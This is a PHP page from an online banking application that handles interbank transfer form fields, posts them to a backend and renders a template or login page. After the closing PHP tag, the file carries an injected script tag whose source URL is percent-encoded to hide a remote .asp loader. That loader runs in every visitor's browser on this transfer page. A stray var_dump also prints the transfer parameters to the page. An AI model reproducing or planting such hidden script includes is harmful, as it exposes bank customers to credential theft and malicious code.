<?php
//
// $Id: speuaTTV.php,v 1.0 2001/11/01 11:22:30 smb Exp $
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2001 Internet de Alta Calidad, S.A. de C.V.  All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//

include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
$backend = $ini->read_var( "eZTransaccionMain", "Backend" );

include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "speuaTTV.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "speuaTTV_tpl" => "speuaTTV.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $session->refresh();

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
//HB    
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];
		
	if(!empty($_POST['Empresa']))
		$Empresa = $_POST['Empresa'];
		
	if(!empty($_POST['FrAccount']))
		$FrAccount = $_POST['FrAccount'];
		
	if(!empty($_POST['ToAccount']))
		$ToAccount = $_POST['ToAccount'];
		
	if(!empty($_POST['Apocope']))
		$Apocope = $_POST['Apocope'];
		
	if(!empty($_POST['NombreB']))
		$NombreB = $_POST['NombreB'];
		
	if(!empty($_POST['Desc']))
		$Desc = $_POST['Desc'];
		
	if(!empty($_POST['Amount']))
		$Amount = $_POST['Amount'];
		
	if(!empty($_POST['Plaza2']))
		$Plaza2 = $_POST['Plaza2'];
		
	if(!empty($_POST['Plaza3']))
		$Plaza3 = $_POST['Plaza3'];
		
	if(!empty($_POST['DireccB']))
		$DireccB = $_POST['DireccB'];
		
	if(!empty($_POST['LadaB']))
		$LadaB = $_POST['LadaB'];
		
	if(!empty($_POST['TeleB']))
		$TeleB = $_POST['TeleB'];
		
	if(!empty($_POST['RFC']))
		$RFC = $_POST['RFC'];
		
	if(!empty($_POST['Nomben2']))
		$Nomben2 = $_POST['Nomben2'];
		
	if(!empty($_POST['Nomben3']))
		$Nomben3 = $_POST['Nomben3'];
		
	if(!empty($_POST['Parent2']))
		$Parent2 = $_POST['Parent2'];
		
	if(!empty($_POST['RenInt']))
		$RenInt = $_POST['RenInt'];
//HB    
    if(empty($Access)) {
        $Access = "FrAc";
    }
    $Empresa = "TTV";
    switch($Access) {
    case "FrAc":
        $particularFields = "&Empresa=".urlencode($Empresa);
        $tr->blog($qki,"SpeuaTT", $FrAccount, $Apocope, $NombreB, $Amount, $Empresa);
        break;
    case "Confirm":
    case "Process":
        $particularFields = "&FrAccount=".urlencode($FrAccount)."&Apocope=".urlencode($Apocope)."&Amount=".urlencode($Amount)."&ToAccount=".urlencode($ToAccount)."&NombreB=".urlencode($NombreB)."&DireccB=".urlencode($DireccB)."&LadaB=".urlencode($LadaB)."&TeleB=".urlencode($TeleB)."&Desc=".urlencode(preg_replace("/&/", "-", $Desc))."&RFC=".urlencode($RFC)."&RenInt=".urlencode($RenInt)."&Button=".urlencode($Button)."&Empresa=".urlencode($Empresa)."&Nomben2=".urlencode($Nomben2)."&Plaza2=".urlencode($Plaza2)."&Plaza3=".urlencode($Plaza3)."&Parent2=".urlencode($Parent2)."&Nomben3=".urlencode($Nomben3);  //HB AGL
        $tr->blog($qki,"SpeuaTTV", $FrAccount, $Apocope, $PlazaB, $NombreB, $Amount);
        break;
    }
    $transaccion_buffer = "";
    // DebugBreak();
    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=spi&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // SPEUATTV

    $t->set_var( "transaccion_buffer", $transaccion_buffer );
    $t->pparse( "output", "speuaTTV_tpl" );
    var_dump($particularFields);
}
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/speuaTTV/" );

    $t->pparse( "output", "user_login_tpl" );
}
?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>